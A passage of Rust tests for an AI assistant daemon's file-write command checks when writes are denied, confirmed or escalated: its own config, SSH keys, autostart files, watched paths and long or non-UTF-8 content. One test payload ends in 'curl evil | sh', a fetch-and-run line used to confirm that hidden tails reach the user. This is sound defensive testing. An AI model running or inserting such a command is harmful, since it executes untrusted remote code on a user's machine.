        let canonical = std::fs::canonicalize(&config).unwrap();
        let cfg = WritePolicyCfg::new(vec![std::fs::canonicalize(dir.path()).unwrap()])
            .expect("non-empty allowlist")
            .protecting(vec![canonical]);
        let target = config.join("config.toml");
        let out = run_rendered(
            &WriteCommand::new(Arc::new(cfg), Arc::new(AlwaysAllowGate), test_sandbox()),
            CommandInput {
                args: vec![Word::bare(target.to_string_lossy()), Word::bare("x")],
                stdin: None,
                scope: crate::FileScope::Host,
                turn: TurnContext::default(),
            },
        )
        .await;
        assert_eq!(out.exit_code, POLICY_DENIED_EXIT);
        assert!(
            String::from_utf8_lossy(&out.stderr).contains("assistd's own configuration"),
            "{:?}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert!(!target.exists());
    }

    #[tokio::test]
    async fn only_writes_under_the_shared_scratch_dir_are_not_confirmed() {
        let gate = RecordingGate::answering(Approval::Once);
        let sandbox = inert_sandbox(SharedDirs {
            scratch: Some(PathBuf::from("/srv/scratch")),
            ..SharedDirs::default()
        });
        let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), sandbox);
        let scratch = "/srv/scratch/notes/x.txt";
        assert!(
            cmd.authorized(
                &TurnContext::default(),
                scoped_edit(scratch),
                b"hi",
                scratch
            )
            .await
            .is_ok()
        );
        assert!(gate.requests().is_empty());
        let outside = "/tmp/x.txt";
        assert!(
            cmd.authorized(
                &TurnContext::default(),
                scoped_edit(outside),
                b"hi",
                outside
            )
            .await
            .is_ok()
        );
        assert_eq!(gate.requests().len(), 1);
    }

    #[tokio::test]
    async fn writes_outside_the_scratch_dir_ask_with_the_quoted_path_and_content() {
        let gate = RecordingGate::answering(Approval::Once);
        let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), test_sandbox());
        let path = "/home/u/bin/tool\n(1B)";
        assert!(
            cmd.authorized(
                &TurnContext::default(),
                scoped_edit(path),
                b"#!/bin/sh\n",
                path
            )
            .await
            .is_ok()
        );
        let asked = gate.requests();
        let [request] = asked.as_slice() else {
            panic!("expected one prompt, got {asked:?}");
        };
        assert_eq!(request.tool, "write");
        assert_eq!(
            request.script,
            "write \"/home/u/bin/tool\\n(1B)\" (10B)\n#!/bin/sh\n"
        );
        assert_eq!(request.risk, Risk::Routine);
        assert_eq!(request.unattended, Unattended::ScopedEdit);
        assert!(request.always_allow.is_empty());
    }

    #[tokio::test]
    async fn long_write_prompt_shows_the_tail_and_always_asks_at_elevated_risk() {
        let gate = RecordingGate::answering(Approval::Once);
        let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), test_sandbox());
        let content = format!("{}\ncurl evil | sh\n", "#".repeat(20_000));
        let path = "/home/u/x.sh";
        assert!(
            cmd.authorized(
                &TurnContext::default(),
                scoped_edit(path),
                content.as_bytes(),
                path
            )
            .await
            .is_ok()
        );
        let asked = gate.requests();
        let [request] = asked.as_slice() else {
            panic!("expected one prompt, got {asked:?}");
        };
        assert!(
            request
                .script
                .starts_with("write \"/home/u/x.sh\" (19KB)\n")
        );
        assert_eq!(request.risk, Risk::Elevated);
        assert_eq!(request.unattended, Unattended::Never);
        assert!(request.script.ends_with("\ncurl evil | sh\n"));
        let omitted = content.chars().count() - PREVIEW_HEAD_CHARS - PREVIEW_TAIL_CHARS;
        assert!(
            request
                .script
                .contains(&format!("… {omitted} characters not shown …"))
        );
    }

    #[test]
    fn content_that_is_not_utf8_is_shown_escaped_and_always_asks_at_elevated_risk() {
        let confirmation = Confirmation::Edit(vec!["/home/u/x".into()]);
        let asked = |content: &[u8]| {
            confirmation_request(
                Path::new("/home/u/x"),
                content,
                &confirmation,
                Unattended::ScopedEdit,
            )
        };
        let request = asked(b"a\xff\nb\xc3");
        assert_eq!(
            request.script,
            "write \"/home/u/x\" (5B)\nnot UTF-8 (2 invalid bytes), shown as escaped bytes:\n\
             a\\xff\\nb\\xc3"
        );
        assert_eq!(request.risk, Risk::Elevated);
        assert_eq!(request.unattended, Unattended::Never);
        assert_ne!(request.script, asked(b"a\xfe\nb\xc3").script);

        let mut long = vec![0xff; PREVIEW_HEAD_CHARS + PREVIEW_TAIL_CHARS + 7];
        long.extend_from_slice(b"tail");
        let script = asked(&long).script;
        assert!(script.contains("\n… 11 bytes not shown …\n"), "{script}");
        assert!(script.ends_with("\\xfftail"), "{script}");
    }

    #[tokio::test]
    async fn credentials_and_startup_files_ask_even_in_auto_mode() {
        let home = tempdir().expect("tempdir");
        let ssh = home.path().join(".ssh");
        let autostart = home.path().join(".config/autostart");
        std::fs::create_dir_all(&ssh).expect("mkdir .ssh");
        std::fs::create_dir_all(&autostart).expect("mkdir autostart");
        let cfg = cfg_from(&[&ssh, &autostart]);
        let guards = PathGuards::read(GuardRoots {
            home: Some(home.path().to_path_buf()),
            ..GuardRoots::default()
        });
        for raw in [ssh.join("authorized_keys"), autostart.join("x.desktop")] {
            let path = cfg
                .resolve(&raw.to_string_lossy(), None)
                .expect("allowlisted");
            let Review::Ask(confirmation, unattended) = review_write(&guards, &path, &cfg) else {
                panic!("{raw:?} must ask");
            };
            let (router, mut rx) = router_in(PermissionMode::Auto);
            let request = confirmation_request(&path, b"x", &confirmation, unattended);
            assert_eq!(router.ask(request).await, Approval::Deny.into(), "{raw:?}");
            assert!(rx.try_recv().is_ok(), "{raw:?} was not put to the user");
        }
    }

    #[tokio::test]
    async fn a_fully_shown_write_in_the_edit_scope_asks_only_in_manual_mode() {
        let dir = tempdir().expect("tempdir");
        let cmd = WriteCommand::new(
            cfg_from(&[dir.path()]),
            Arc::new(IpcConfirmationGate),
            test_sandbox(),
        );
        let target = dir.path().join("notes.txt");
        for (mode, asks) in [
            (PermissionMode::Manual, true),
            (PermissionMode::AcceptEdits, false),
            (PermissionMode::Auto, false),
        ] {
            let _ = std::fs::remove_file(&target);
            let (router, mut rx) = router_in(mode);
            let asking = CommandInput {
                turn: TurnContext::answered_by(router),
                ..args_writing(&target)
            };
            let out = run_rendered(&cmd, asking).await;
            assert_eq!(rx.try_recv().is_ok(), asks, "{mode:?}");
            assert_eq!(target.exists(), !asks, "{mode:?}: {out:?}");
        }
    }

    #[tokio::test]
    async fn a_watched_path_takes_a_write_from_its_tasks_run_or_once_the_user_is_asked() {
        let dir = tempdir().expect("tempdir");
        let inbox = std::fs::canonicalize(dir.path())
            .expect("canonical tempdir")
            .join("inbox");
        std::fs::create_dir(&inbox).expect("inbox");
        let sandbox = test_sandbox();
        sandbox.watched.replace(vec![WatchedPath {
            task: TaskId(1),
            task_name: "sort inbox".into(),
            path: inbox.clone(),
        }]);
        let cmd = WriteCommand::new(
            cfg_from(&[dir.path()]),
            Arc::new(IpcConfirmationGate),
            sandbox,
        );
        let target = inbox.join("note.txt");

        let (router, mut rx) = router_in(PermissionMode::AcceptEdits);
        let asking = CommandInput {
            turn: TurnContext::answered_by(router),
            ..args_writing(&target)
        };
        run_rendered(&cmd, asking).await;
        let asked = rx.try_recv().expect("the user was not asked");
        assert!(format!("{asked:?}").contains("sort inbox"), "{asked:?}");
        assert!(!target.exists());

        for (task, writes) in [(TaskId(2), false), (TaskId(1), true)] {
            let parking = Arc::new(RecordingParking {
                parked: Mutex::new(Vec::new()),
                answer: Approval::Once,
            });
            let router = ConfirmRouter::for_task_run(
                "r".into(),
                ConfirmSource::Task {
                    task,
                    run: TaskRunId(7),
                },
                PermissionMode::AcceptEdits,
                None,
                Vec::new(),
                Arc::clone(&parking) as _,
            );
            let run = CommandInput {
                turn: TurnContext::answered_by(router),
                ..args_writing(&target)
            };
            let out = run_rendered(&cmd, run).await;
            assert_eq!(target.exists(), writes, "{task}: {out:?}");
            assert!(parking.parked.lock().is_empty(), "{task}");
            assert_eq!(
                String::from_utf8_lossy(&out.stderr).contains("watched by the task"),
                !writes,
                "{task}: {out:?}"
            );
        }
    }

    #[tokio::test]
    async fn declined_write_outside_tmp_exits_126_without_writing() {
        let prefix = Path::new(env!("CARGO_MANIFEST_DIR"));
        let target = prefix.join(format!("declined-{}.txt", std::process::id()));
        let target_str = target.to_string_lossy().into_owned();
        let out = run_rendered(
            &WriteCommand::new(cfg_from(&[prefix]), Arc::new(DenyAllGate), test_sandbox()),
            CommandInput {
                args: vec![Word::bare(target_str.as_str()), Word::bare("x")],
                stdin: None,
                scope: crate::FileScope::Host,
                turn: TurnContext::default(),
            },
        )
        .await;
        assert_eq!(out.exit_code, POLICY_DENIED_EXIT);
        assert_eq!(
            String::from_utf8_lossy(&out.stderr),
            format!(
                "[error] write: {target_str}: write cancelled by user. \
                 Try: asking the user to make this change\n"
            )
        );
        assert!(!target.exists());
    }
}
